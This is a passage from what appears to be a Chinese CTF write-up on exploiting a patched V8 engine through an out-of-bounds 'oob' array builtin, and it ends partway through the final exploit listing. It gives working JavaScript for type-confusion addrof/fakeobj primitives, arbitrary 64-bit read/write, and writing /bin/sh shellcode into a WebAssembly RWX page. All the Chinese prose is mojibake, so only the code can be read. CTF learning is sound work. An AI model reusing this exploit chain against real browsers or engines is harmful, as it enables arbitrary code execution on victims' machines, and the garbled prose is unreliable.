äº†1ï¼Œä»¥ä¾¿è¡¨ç¤ºå®ƒæ˜¯ä¸ªå¯¹è±¡ã€‚å› æ­¤ä¸Šå›¾è¯¥å¯¹è±¡çš„å®é™…å†…å­˜åœ°å€åº”è¯¥ä¸º(0x346b7364dde9-1=**0x346b7364dde8**)\n\nè€Œå¯¹äºæ•°ç»„å¯¹è±¡åˆ™å¤§è‡´å¦‚ä¸‹å¸ƒå±€\n\n|    map     | è¡¨æ˜äº†ä¸€ä¸ªå¯¹è±¡çš„ç±»å‹å¯¹è±¡ï¼Œä¸Šå›¾å³ä¸ºPACKED_SMI_ELEMENTS |\n| :--------: | :---------------------------------------------------: |\n| prototype  |                       prototype                       |\n|  elements  |                       å¯¹è±¡å…ƒç´                         |\n|   length   |                       å…ƒç´ ä¸ªæ•°                        |\n| properties |                         å±æ€§                          |\n\nè€Œå¯¹äºå…¶ä¸­çš„elementså…ƒç´ ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¸”åœ°å€ä½äºå¯¹è±¡açš„ä¸Šæ–¹ï¼Œèƒ½çœ‹åˆ°é‡Œé¢çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´å…ˆç”³è¯·çš„elementsè¿™ä¸ªå…ƒç´ å†…å­˜ï¼Œç„¶åå†ç”³è¯·çš„æ•°ç»„å¯¹è±¡a\n\n![image-20220301222151967](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012221043.png)\n\né‚£ä¹ˆæ€»çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹\n\n```\nelements     ----> +------------------------+\n                   |          MAP           +<---------+\n                   +------------------------+          |\n                   |      element 1         |          |\n                   +------------------------+          |\n                   |      element 2         |          |\n                   |      ......            |          |\n                   |      element n         |          |\n                   +------------------------+          |\n                   |      .........         |          |\n ArrayObject  ---->-------------------------+          |\n                   |      map               |          |\n                   +------------------------+          |\n                   |      prototype         |          |\n                   +------------------------+          |\n                   |      elements          |+--------+|\n                   +------------------------+\n                   |      length            |\n                   +------------------------+\n                   |      properties        |\n                   +------------------------+\n```\n\nå…¶ä»–ç±»å‹çš„å¯¹è±¡éƒ½æœ‰äº›ç±»ä¼¼ï¼Œå¯ä»¥è‡ªå·±å»å°è¯•çœ‹çœ‹\n\nå…¶ä¸­ä¹Ÿä¸ä¸€å®šå…ƒç´ åé¢å°±è·Ÿçš„æ˜¯`ArrayObject`çš„å†…å®¹ï¼Œä¹Ÿå¯èƒ½ä¸­é—´é—´éš”äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚å¦‚ä¸‹æƒ…å½¢ï¼Œ`elements`çš„åœ°å€å’Œ`ArrayObject`çš„åœ°å€å·®çš„è¿˜æ˜¯æŒºå¤§çš„ï¼Œå¯èƒ½æ˜¯å†…å­˜åˆ†é…ä¸Šçš„ä¸€äº›é—®é¢˜å§?ä¸å¤ªæ‡‚v8çš„å†…å­˜åˆ†é…æ˜¯æ€ä¹ˆå®ç°çš„ã€‚\n\n![image-20220318205130634](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182051776.png)\n\n### (2)ä¸åŒå¯¹è±¡ç±»å‹å†…å­˜åˆ†å¸ƒ\n\n#### â‘ æ•°ç»„å¯¹è±¡\n\n```js\nvar array = [1.1,2.2,3.3];\n```\n\nå¦‚ä¸‹å†…å­˜å¸ƒå±€\n\n```\nelements     ----> +------------------------+<---------+\n                   |          MAP           +\t\t   |\n                   +------------------------+          |\n                   |      element 1         |          |\n                   +------------------------+          |\n                   |      element 2         |          |\n                   |      ......            |          |\n                   |      element n         |          |\n                   +------------------------+          |\n                   |      .........         |          |\n ArrayObject  ---->-------------------------+          |\n                   |      map               |          |\n                   +------------------------+          |\n                   |      prototype         |          |\n                   +------------------------+          |\n                   |      elements          |+--------+|\n                   +------------------------+\n                   |      length            |\n                   +------------------------+\n                   |      properties        |\n                   +------------------------+\n```\n\ndoubleæˆ–è€…floatçš„æ•°ç»„ä¹Ÿç›¸ä¼¼ï¼Œå°±æ˜¯mapçš„ç±»å‹ä¸º`PACKED_DOUBLE_ELEMENTS`\n\n#### â‘¡å¯¹è±¡æ•°ç»„å¯¹è±¡\n\n```js\nvar objectArray = [a, b];//a,bä¸ºå¯¹è±¡\n```\n\nå³æ•°ç»„é‡Œå­˜æ”¾çš„æ˜¯å¯¹è±¡ï¼Œä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œå°±æ˜¯åœ¨elementsä¸­ä¼šæœ‰ç‚¹ä¸ä¸€æ ·ï¼Œç›¸å½“äºå­˜æ”¾ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘åŒ…å«çš„å¯¹è±¡ï¼ŒåŒ…æ‹¬mapçš„ç±»å‹ä¹Ÿä¸åŒï¼Œä¸º`PACKED_ELEMENTS`\n\n![image-20220301223028101](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012230225.png)\n\n```\nelementA     ----> +------------------------+<---------+\n                   |         MAP            +\t\t   |\n                   +------------------------+          |\n                   |       Length           +\t\t   |\n                   +------------------------+          |\n                   |      element 1         |          |\n                   +------------------------+          |\n                   |      element 2         |          |\n                   |      ......            |          |\n                   |      element n         |          |\n                   +------------------------+          |\n                   |      .........         |          |\nelementB     ----> +------------------------+<---------+\n                   |         MAP            +\t\t   |\n                   +------------------------+          |\n                   |       Length           +\t\t   |\n                   +------------------------+          |\n                   |      element 1         |          |\n                   +------------------------+          |\n                   |      element 2         |          |\n                   |      ......            |          |\n                   |      element n         |          |\n                   +------------------------+          |\n                   |      .........         |          |\n ArrayObject  ---->-------------------------+          |\n                   |      map               |          |\n                   +------------------------+          |\n                   |      prototype         |          |\n                   +------------------------+          |\n                   |      elements          |+--------+|\n                   +------------------------+\n                   |      length            |\n                   +------------------------+\n                   |      properties        |\n                   +------------------------+\n```\n\n### (3)ç±»å‹æ··æ·†\n\nå³å½“æˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹`ArrayObject`çš„mapå±æ€§æ—¶ï¼Œå°±èƒ½å¤Ÿé€ æˆç±»å‹æ··æ·†ã€‚æ¯”å¦‚\n\n```js\nlet float_array = [1.1,2.2,3.3,4.4];//åˆ›å»ºä¸€ä¸ªæµ®ç‚¹æ•°æ•°ç»„\nlet obj = {\"a\": 1};//åˆ›å»ºä¸€ä¸ªå¯¹è±¡\nlet obj_array = [obj];//åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ•°ç»„\nlet float_array_map = float_array[4];//å‡è®¾å¯ä»¥è¶Šç•Œå°†float_arrayçš„mapå±æ€§çš„å€¼è¯»å‡ºæ¥\n\n//å‡è®¾å¯ä»¥è¶Šç•Œå†™obj_arrayçš„mapå±æ€§ï¼Œä¿®æ”¹ä¸ºæµ®ç‚¹æ•°æ•°ç»„çš„mapå±æ€§çš„å€¼\nobj_array[1] = float_array_map;\n\n//ç”±äºobj_arrayçš„mapå±æ€§è¢«ä¿®æ”¹ä¸ºæµ®ç‚¹æ•°æ•°ç»„çš„mapå±æ€§\n//é‚£ä¹ˆæ­¤æ—¶å½“jså»è§£æçš„æ—¶å€™ï¼Œå°±ä¼šæŠŠobj_array[0]å½“ä½œä¸€ä¸ªæµ®ç‚¹æ•°\n//ä»è€Œèƒ½å¤Ÿè¯»å‡ºobj_array[0]çš„åœ°å€,å³objçš„åœ°å€\nlet obj_addr = f2i(obj_array[0]);//f2iä¸ºæµ®ç‚¹è½¬æ— ç¬¦å·æ•´æ•°å‡½æ•°\n```\n\nåŒæ ·çš„ï¼Œå½“æˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹æŠŠä¸€ä¸ªæµ®ç‚¹æ•°æ•°ç»„çš„mapå±æ€§æ”¹ä¸ºå¯¹è±¡æ•°ç»„çš„mapå±æ€§æ—¶ï¼Œå°±èƒ½å¤Ÿä½¿å¾—v8è®¤ä¸ºè¯¥æµ®ç‚¹æ•°æ•°ç»„ä¸­çš„æµ®ç‚¹æ•°å®é™…æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œæˆ‘ä»¬æ§åˆ¶æ•°ç»„ä¸­çš„å˜é‡çš„å€¼ä¸ºä¸€ä¸ªåœ°å€ï¼Œè¿™æ ·å°±èƒ½å°†ä¸€ä¸ªä»»æ„åœ°å€è½¬åŒ–ä¸ºä¸€ä¸ªobjå¯¹è±¡äº†ã€‚\n\n```js\nlet float_array = [1.1,2.2,3.3,4.4];//åˆ›å»ºä¸€ä¸ªæµ®ç‚¹æ•°æ•°ç»„\nlet obj = {\"a\": 1};//åˆ›å»ºä¸€ä¸ªå¯¹è±¡\nlet obj_array = [obj];//åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ•°ç»„\nlet obj_array_map = obj_array[1];//å‡è®¾å¯ä»¥è¶Šç•Œå°†obj_arrayçš„mapå±æ€§çš„å€¼è¯»å‡ºæ¥\n\n//å‡è®¾å¯ä»¥è¶Šç•Œå†™float_arrayçš„mapå±æ€§ï¼Œä¿®æ”¹ä¸ºobj_arrayçš„mapå±æ€§çš„å€¼\nfloat_array[4] = obj_array_map;\n\n//ç”±äºfloat_arrayçš„mapå±æ€§è¢«ä¿®æ”¹ä¸ºå¯¹è±¡æ•°ç»„çš„mapå±æ€§\n//é‚£ä¹ˆæ­¤æ—¶å½“jså»è§£æçš„æ—¶å€™ï¼Œå°±ä¼šæŠŠfloat_array[0]å½“ä½œä¸€ä¸ªå¯¹è±¡\n//ä»è€Œèƒ½å¤Ÿä¼ªé€ ä»»æ„åœ°å€ä¸ºä¸€ä¸ªè™šå‡çš„å¯¹è±¡\nfake_obj_addr = i2f(0x111111);//i2fä¸ºæ•´æ•°è½¬æµ®ç‚¹æ•°\nfloat_array[0] = fake_obj_addr;\nlet fake_obj = float_array[0];//è·å–è¯¥è™šå‡å¯¹è±¡\n```\n\n\n\n# ä¸‰ã€å®é™…é¢˜ç›®\n\nå‚è€ƒï¼š[ä»ä¸€é“CTFé¢˜é›¶åŸºç¡€å­¦V8æ¼æ´åˆ©ç”¨ â€“ backup (4hou.win)](https://4hou.win/wordpress/?p=32405)\n\n## 1.é¢˜ç›®åˆ†æ\n\næ·»åŠ çš„diffå¦‚ä¸‹ï¼Œä¸»è¦æ˜¯ä¸€ä¸‹ä¸¤éƒ¨åˆ†ï¼Œå…¶ä»–éƒ¨åˆ†åŠ å…¥çš„å°±åªæ˜¯ä¸ºäº†æ­£å¸¸è¿è¡Œè€Œå·²\n\n```diff\n+    SimpleInstallFunction(isolate_, proto, \"oob\",\n+                          Builtins::kArrayOob,2,false);\n\n\n+BUILTIN(ArrayOob){\n+    uint32_t len = args.length();\n+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();\n+    Handle<JSReceiver> receiver;\n+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(\n+            isolate, receiver, Object::ToObject(isolate, args.receiver()));\n+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);\n+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());\n+    uint32_t length = static_cast<uint32_t>(array->length()->Number());\n+    if(len == 1){\n+        //read\n+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));\n+    }else{\n+        //write\n+        Handle<Object> value;\n+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(\n+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));\n+        elements.set(length,value->Number());\n+        return ReadOnlyRoots(isolate).undefined_value();\n+    }\n+}\n\n\n\n\n#ä»¥ä¸‹ä¸¤éƒ¨åˆ†åªæ˜¯ä¸ºäº†èƒ½æ­£å¸¸è¿è¡Œè¿™ä¸ªæ·»åŠ çš„å‡½æ•°è€Œå·²\n+  CPP(ArrayOob)        \\\n\n\n+    case Builtins::kArrayOob:\n+      return Type::Receiver();\n \n```\n\nå³æ·»åŠ äº†ä¸ºæ•°ç»„å¯¹è±¡`ArrayOob`æ·»åŠ äº†ä¸€ä¸ªå‡½æ•°oob()ï¼Œå…¶åŠŸèƒ½ä¸º\n\n- å½“å‚æ•°åªæœ‰ä¸€ä¸ª(é»˜è®¤ä¼ å…¥thisæŒ‡é’ˆ)ï¼Œè¿”å›æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ä¹‹åçš„å…ƒç´ \n- å½“å‚æ•°æœ‰ä¸¤ä¸ª(é™¤äº†thisæŒ‡é’ˆä¹‹å¤–å†ä¼ å…¥ä¸€ä¸ªå‚æ•°)ï¼Œå°±ç”¨æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°è¦†ç›–æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ä¹‹åçš„å…ƒç´ \n- å…¶ä»–æƒ…å†µä¸‹è¿”å›ä¸€ä¸ªundefined\n\nå³è¯¥å‡½æ•°å¯ä»¥å®ç°**è¯»/å†™**æ•°ç»„å¯¹è±¡MAPå±æ€§\n\n## 2.æ¼æ´åˆ†æ\n\nå…³é”®åœ¨äºæ•°ç»„å¯¹è±¡`ArrayOob`çš„å†…å­˜ç©ºé—´ï¼Œå°è¯•çœ‹ä¸€ä¸‹\n\n```js\nlet float_array = [1.1,2.2,3.3,4.4];\n%DebugPrint(float_array);\n%SystemBreak();\n```\n\nè°ƒè¯•è·‘èµ·æ¥ï¼ŒæŸ¥çœ‹elementså¤„çš„å†…å­˜\n\n![image-20220318201300196](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182013498.png)\n\nå³åœ¨æ•°ç»„å¯¹è±¡çš„å…ƒç´ ä¹‹åä¸ºæ•°ç»„å¯¹è±¡çš„ç»“æ„ä½“ï¼Œä¹‹å‰ä¹Ÿæåˆ°è¿‡ã€‚è€Œå¯¹è±¡çš„mapå¦‚æœèƒ½è¢«ä¿®æ”¹ï¼Œå°±èƒ½å¼•èµ·v8çš„ç±»å‹æ··æ·†ï¼Œä¹‹å‰å·²ç»æåˆ°è¿‡ã€‚\n\né‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨ç±»å‹æ··æ·†ï¼Œæ¥æ„é€ è·å–ä»»æ„å¯¹è±¡çš„åœ°å€çš„å‡½æ•°`getAddress(obj)`ä»¥åŠä¿®æ”¹ä»»æ„åœ°å€ä¸ºå¯¹è±¡çš„å‡½æ•°`getFakeObj(addr)`\n\n### (1)æ„é€ è½¬åŒ–å‡½æ•°\n\n```js\nlet float_array = [1.1,2.2,3.3,4.4];//åˆ›å»ºä¸€ä¸ªæµ®ç‚¹æ•°æ•°ç»„\nlet obj = {\"a\": 1};//åˆ›å»ºä¸€ä¸ªå¯¹è±¡\nlet obj_array = [obj];//åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ•°ç»„\nlet float_array_map = float_array.oob()\nlet obj_array_map = obj_array.oob()\n\nfunction getAddress(obj)\n{\n    obj_array[0] = obj;//è®¾ç½®å¯¹è±¡æ•°ç»„\n    obj_array.oob(float_array_map);//å°†åŸæœ¬æ˜¯å¯¹è±¡çš„mapè¦†ç›–ä¸ºæµ®ç‚¹æ•°æ•°ç»„çš„map,ä¹‹åè¯»å–å°±ä¼šä»¥æµ®ç‚¹æ•°ç»„å¯¹è±¡çš„å½¢å¼è¯»å–\n    //ä»å¯¹è±¡æ•°ç»„ä¸­è¯»å‡ºå¯¹è±¡ï¼Œä½†æ˜¯æ­¤æ—¶æ•´ä¸ªå¯¹è±¡æ•°ç»„å·²ç»è¢«æ”¹æˆæµ®ç‚¹æ•°ç»„ï¼Œæ‰€ä»¥ä¼šä»¥æµ®ç‚¹æ•°æ•°ç»„å½¢å¼è¯»å–ï¼Œå¾—åˆ°è¯¥å¯¹è±¡çš„åœ°å€\n    //æ­£å¸¸æƒ…å†µä»å¯¹è±¡æ•°ç»„ä¸­è¯»å–å¯¹è±¡ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œä¸æ˜¯è¯¥å¯¹è±¡çš„åœ°å€ï¼Œä½†æ˜¯è½¬æ¢æˆæµ®ç‚¹æ•°ç»„å°±ä¼šè¯»å–åˆ°æˆå‘˜çš„åœ°å€ï¼Œè¿™å°±æ˜¯ç±»å‹æ··æ·†\n    let addr = mem.f2i(obj_array[0])\n    obj_array.oob(obj_map);//é‡æ–°è®¾ç½®å›æ¥\n    return addr;\n}\n\n\nfunction getFakeObj(addr)\n{\n    float_array[0] = mem.i2f(addr);//è®¾ç½®æµ®ç‚¹æ•°æ•°ç»„\n    float_array.oob(obj_array_map);//è®¾ç½®mapå±æ€§å°†æµ®ç‚¹æ•°æ•°ç»„è½¬åŒ–ä¸ºå¯¹è±¡æ•°ç»„\n    let fake_obj = float_array[0];//è·å–è½¬åŒ–ä¹‹åçš„å¯¹è±¡æ•°ç»„ï¼Œå°±èƒ½å¾—åˆ°è¯¥fake_objï¼Œå…¶åœ°å€ä¸ºaddrï¼Œå¯¹è±¡ç±»å‹ä¸ºå­—å…¸å¯¹è±¡\n    float_array.oob(float_map);//é‡æ–°è®¾ç½®å›æ¥\n    return fake_obj;\n}\n```\n\nå®é™…æµ‹è¯•ä¸€ä¸‹\n\n```js\nlet obj_addr = getAddress(obj);\nconsole.log(\"[*]obj_addr:\"+hex(obj_addr));\n%DebugPrint(obj)\n%SystemBreak()\n```\n\nå¯ä»¥çœ‹åˆ°æˆåŠŸè·å–åœ°å€\n\n![image-20220322121328820](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221213865.png)\n\nä½†æ˜¯è¿™ä¹ˆåˆ¤æ–­è½¬åŒ–å¯¹è±¡æˆåŠŸä¸å¤ªçŸ¥é“...\n\n### (2)åˆ©ç”¨è½¬åŒ–å‡½æ•°æ„é€ ä»»æ„è¯»å†™\n\nå¾—åˆ°äº†ä¸Šè¿°çš„è½¬åŒ–å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿™ä¸¤ä¸ªè½¬åŒ–å‡½æ•°æ¥è·å–ä»»æ„åœ°å€è¯»å’Œä»»æ„åœ°å€å†™\n\n#### åŸç†ï¼š\n\nåˆ©ç”¨`getFakeObj`å°†ä¸€ä¸ªåœ°å€è½¬åŒ–ä¸ºä¸€ä¸ªæµ®ç‚¹æ•°ç»„å¯¹è±¡ï¼Œè€Œå¦‚æœè¯¥åœ°å€æŒ‡å‘çš„elementsæŒ‡é’ˆå¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿä¿®æ”¹å…¶elementsæŒ‡é’ˆï¼Œä»è€ŒæŒ‡å‘ä»»æ„åœ°æ–¹ï¼Œå»è¿›è¡Œè¯»å†™æ“ä½œã€‚\n\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºä¾æ®elementsè¯»å†™çš„æ—¶å€™æ²¡æœ‰è¿›è¡Œæ£€æµ‹ï¼Œæ‰€ä»¥åªè¦æˆåŠŸä¿®æ”¹äº†elementsæŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬æˆ‘ä»¬å°±èƒ½ä»elementså®é™…å­˜æ”¾æ•°æ®çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯*(elements+0x10)å¤„è¯»å†™æˆ‘ä»¬çš„æ•°æ®ï¼Œé€ æˆä»»æ„åœ°å€è¯»å†™ã€‚\n\nå‡å®šç”³è¯·`fake_array[6]`ï¼Œå¦‚ä¸‹å›¾å¸ƒå±€\n\n![æœªå‘½åæ–‡ä»¶ (2)](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221519946.png)\n\nå³å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè®¾ç½®`fake_array_addr-0x40+0x10`çš„åœ°å€ä¸ºä¸€ä¸ª`fake_obj`ï¼Œé‚£ä¹ˆè¯¥`fake_obj`ç›¸å…³çš„å±æ€§å¦‚ä¸‹\n\n- `map`å³ä¸º`float_array_map`ï¼Œå¯ä»¥ç”±fake_array[0]è¿›è¡Œæ§åˆ¶ï¼Œç”±æ­¤å¯ä»¥è¿›è¡Œå…ƒç´ è¯»å†™\n\n- `protototype`å³è®¾ç½®ä¸º0ï¼Œå¯ç”±`fake_array[1]`è¿›è¡Œæ§åˆ¶\n- `elements`å³è®¾ç½®ä¸ºæˆ‘ä»¬éœ€è¦è¯»å†™çš„åœ°å€ï¼Œå¯ç”±`fake_array[2]`è¿›è¡Œæ§åˆ¶\n\né‚£ä¹ˆå³å¯å®Œæˆæ•´ä¸ªè¯»å†™å¸ƒå±€ã€‚\n\n#### ä»£ç ï¼š\n\n```js\nlet fake_array = [\n    float_array_map,\n    mem.i2f(0n),\n    mem.i2f(0x41414141n),\n    mem.i2f(0x1000000000n),\n    1.1,\n    2.2,\n];\nlet fake_array_addr = getAddress(fake_array);\nlet fake_object_addr = fake_array_addr - 0x40n + 0x10n;\nlet fake_object = getFakeObj(fake_object_addr);\n\nfunction read64(addr)\n{\n    fake_array[2] = mem.i2f(addr - 0x10n + 0x1n);\n    let leak_data = mem.f2i(fake_object[0]);\n    console.log(\"[*] leak from: \" +hex(addr) + \": \" + hex(leak_data));\n    return leak_data;\n}\n\nfunction write64(addr, data)\n{\n    fake_array[2] = mem.i2f(addr - 0x10n + 0x1n);\n    fake_object[0] = mem.i2f(data);\n    console.log(\"[*] write to : \" +hex(addr) + \": \" + hex(data));    \n}\n```\n\n#### æµ‹è¯•æ•ˆæœï¼š\n\n```js\n%DebugPrint(fake_array);\nconsole.log(\"[*] fake_array_addr:\" + hex(fake_array_addr));\nconsole.log(\"[*] fake_object_addr:\" + hex(fake_object_addr));\nread64(fake_array_addr-0x40n+0x28n-1n);\nwrite64(fake_object_addr+0x18n-1n,0x01020304n);\n%SystemBreak();\n```\n\né‚£ä¹ˆæˆ‘ä»¬å³è¯»å†™fake_array[3]å¤„çš„å€¼ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸè¯»å†™\n\n![image-20220322152925354](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221529435.png)\n\n## 3.å®é™…åˆ©ç”¨\n\n### (1)å¸¸è§„å †æ€è·¯\n\né€šè¿‡æ³„éœ²d8çš„ELFåœ°å€ï¼Œè®¡ç®—å…¶GOTè¡¨åœ°å€ï¼Œä»»æ„è¯»æ³„éœ²å‡ºlibcåœ°å€ï¼Œç„¶åè¦†ç›–`free_hook`ä¸º`system`å‡½æ•°ï¼Œä¹‹åé€šè¿‡`console.log('/bin/sh\\x00')`å³å¯é‡Šæ”¾ä¸€ä¸ªåŒ…å«`/bin/sh`çš„å †å—å®Œæˆåˆ©ç”¨\n\nè¿™ä¸ªæ³„éœ²åœ°å€éƒ¨åˆ†æœ‰ç‚¹ä¸å¤ªå¥½æï¼Œéšæœºæ³„éœ²çš„éƒ¨åˆ†æ²¡çœ‹ï¼Œç¨³å®šæ³„éœ²çš„éƒ¨åˆ†ä¸å¤ªå¯¹ï¼Œè·å–åˆ°çš„ä¸æ˜¯d8ä¸­çš„æŒ‡ä»¤åœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ªlibåº“çš„æŒ‡ä»¤åœ°å€ã€‚\n\nğŸ”ºåé¢è¡¥æŠŠ\n\n### (2)åˆ©ç”¨WASMæœºåˆ¶\n\nå¦‚ä¸‹å¯ä»¥å°†Cè¯­è¨€ç›´æ¥è½¬æ¢ä¸ºwasmå¹¶ç”ŸæˆJSé…å¥—è°ƒç”¨ä»£ç \n\n[WasmFiddle (wasdk.github.io)](https://wasdk.github.io/WasmFiddle/)\n\nwasmå°±æ˜¯ä¸€ä¸ªç”¨æ¥è°ƒç”¨Cä»£ç çš„æœºåˆ¶ï¼Œå¯ä»¥è‡ªå·±å»çœ‹çœ‹ï¼Œä½†æ˜¯ä¸èƒ½èµ‹äºˆå±é™©çš„ä»£ç æ¥è°ƒç”¨ï¼Œåªèƒ½è¿è¡Œæ•°å­¦è®¡ç®—ã€å›¾åƒå¤„ç†ç­‰ç³»ç»Ÿæ— å…³çš„é«˜çº§è¯­è¨€ä»£ç ã€‚\n\nç®€å•æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ç‰‡WASMçš„ç©ºé—´ï¼Œç„¶åå¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹åˆ°è¿™ç‰‡è¿è¡ŒWASMä»£ç çš„å†…å­˜ç©ºé—´(åˆ©ç”¨ä¸Šè¿°çš„ä»»æ„å†™)ï¼Œä¿®æ”¹å…¶ä¸ºshellcodeï¼Œç„¶åå½“d8è°ƒç”¨WASMçš„æ¥å£æ—¶ï¼Œå°±å¯ä»¥è°ƒç”¨åˆ°æˆ‘ä»¬çš„shellcodeäº†ã€‚\n\nè€Œè¿è¡ŒWASMä»£ç çš„å†…å­˜ç©ºé—´å³ä¸ºWASM_instance+0x88å¤„\n\n```js\nlet wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);\nlet wasmModule = new WebAssembly.Module(wasmCode);\nlet wasmInstance = new WebAssembly.Instance(wasmModule, {});\n```\n\nä¹Ÿå°±æ˜¯ä¸Šè¿°çš„`wasmInstance`åœ°å€+0x88å¤„\n\nå…¶ä¸­wasmCodeçš„åŠŸèƒ½ä¸º\n\n```c\nint main() { \n    return 42;\n}\n```\n\n#### â‘ æ³„éœ²åœ°å€\n\n```js\nlet wasm_instance_addr = getAddress(wasmInstance);\nconsole.log(\"[*] wasm_instance_addr: \" + hex(wasm_instance_addr));\nlet rwx_page_addr = read64(wasm_instance_addr -1n + 0x88n);\nconsole.log(\"[*] rwx_page_addr: \" + hex(rwx_page_addr));\n```\n\n#### â‘¡å†™å…¥shellcodeåˆ°wasmçš„rwxæ®µ\n\nè¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¿ç»­ä½¿ç”¨ä¸¤æ¬¡`write64`ä¼šå‡ºé”™ï¼Œå…·ä½“åŸå› ä¸æ¸…æ¥šï¼Œè¯´ä»€ä¹ˆfloatArrayå·²ç»è¢«ç¯¡æ”¹ï¼Œå†æ£€æµ‹åˆæ³•æ€§ä¼šå‡ºé”™ï¼Œè¢«ç¯¡æ”¹æˆå•¥ä¹Ÿä¸çŸ¥é“å•Šï¼Œè¿™è¾¹æœ‰ç‚¹é—®é¢˜ï¼Œä¹‹åçœ‹èƒ½ä¸èƒ½è¡¥ä¸Šã€‚\n\nğŸ”º\n\né‚£ä¹ˆä¾æ®å¤§ä½¬çš„ï¼Œéœ€è¦è¿›è¡Œä¿®æ”¹ï¼Œä½¿ç”¨`dataview`æ¥è¿›è¡Œä¿®æ”¹\n\nåŸç†å³ä¸º\n\nDataViewå¯¹è±¡ä¸­çš„`backing_store`ä¼šæŒ‡å‘ç”³è¯·çš„`data_buf`ï¼ˆ`backing_store`ç›¸å½“äºæˆ‘ä»¬çš„elementsï¼‰ï¼Œä¿®æ”¹`backing_store`ä¸ºæˆ‘ä»¬æƒ³è¦å†™çš„åœ°å€ï¼Œå¹¶é€šè¿‡DataViewå¯¹è±¡çš„setBigUint64æ–¹æ³•å°±å¯ä»¥å¾€æŒ‡å®šåœ°å€æ­£å¸¸å†™å…¥æ•°æ®äº†ã€‚\n\nğŸ”º\n\nä¸å¤ªæ‡‚\n\n```js\nfunction writeAny(addr,data)\n{\n  let data_buf = new ArrayBuffer(data.length * 8);\n  let data_view = new DataView(data_buf);\n  let buf_backing_store_addr = getAddress(data_buf) + 0x20n;\n  console.log(\"[*] buf_backing_store_addr: \"+hex(buf_backing_store_addr));\n\n  write64(buf_backing_store_addr-1n,addr);\n  for (let i = 0; i < data.length; ++i)\n    data_view.setFloat64(i * 8, mem.i2f(data[i]), true);\n}\n\n\nlet shellcode = [\n  0x2fbb485299583b6an,\n  0x5368732f6e69622fn,\n  0x050f5e5457525f54n\n];\nwriteAny(rwx_page_addr,shellcode);\n```\n\n#### â‘¢è°ƒç”¨wasmæ¥æ‰§è¡Œshellcode\n\n```js\nf();\n```\n\nç›´æ¥é€šè¿‡è¿™ä¸ªè°ƒç”¨å³å¯ã€‚\n\n#### EXP:\n\n```js\nfunction hex(i)\n{\n    return '0x'+i.toString(16).padStart(16, \"0\");\n}\nclass Memory{\n    constructor(){\n        this.buf = new ArrayBuffer(16);\n        this.float64 = new Float64Array(this.buf);\n        // this.u32 = new Uint32Array(this.buf);\n        // this.bytes = new Uint8Array(this.buf);\n        this.bigUint64 = new BigUint64Array(this.buf);\n    }\n    f2i(val){\n        this.float64[0] = val;\n        return this.bigUint64[0];\n    }\n    i2f(val){\n        this.bigUint64[0] = val;\n        return this.float64[0];\n    }\n}\n\nlet mem = new Memory()\nlet float_array = [1.1,2.2,3.3,4.4];//åˆ›å»ºä¸€ä¸ªæµ®ç‚¹æ•°æ•°ç»„\nlet obj = {\"a\": 1};//åˆ›å»ºä¸€ä¸ªå¯¹è±¡\nlet obj_array = [obj];//åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ•°ç»„\nlet float_array_map = float_array.oob()\nlet obj_array_map = obj_array.oob()\n\n\nfunction getAddress(obj)\n{\n    obj_array[0] = obj;//è®¾ç½®å¯¹è±¡æ•°ç»„\n    obj_array.oob(float_array_map);//å°†åŸæœ¬æ˜¯å¯¹è±¡çš„mapè¦†ç›–ä¸ºæµ®ç‚¹æ•°æ•°ç»„çš„map,ä¹‹åè¯»å–å°±ä¼šä»¥æµ®ç‚¹æ•°ç»„å¯¹è±¡çš„å½¢å¼è¯»å–\n    